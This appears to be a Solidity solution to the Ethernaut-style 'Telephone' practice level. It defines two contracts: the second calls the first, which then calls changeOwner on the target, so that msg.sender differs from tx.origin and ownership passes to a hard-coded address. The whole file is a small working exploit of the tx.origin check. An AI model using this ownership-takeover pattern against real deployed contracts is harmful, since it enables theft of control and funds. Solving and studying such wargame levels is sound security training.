// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level04.sol";

contract A
{
    Telephone level;
    constructor(address _level) payable
    {
        level = Telephone(_level);
    }

    function exploit() external
    {
        level.changeOwner(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
    }
}

contract B
{
    A a;
    constructor(address _a)
    {
        a = A(_a);
    }

    function send_call() external 
    {
        a.exploit();
    }
}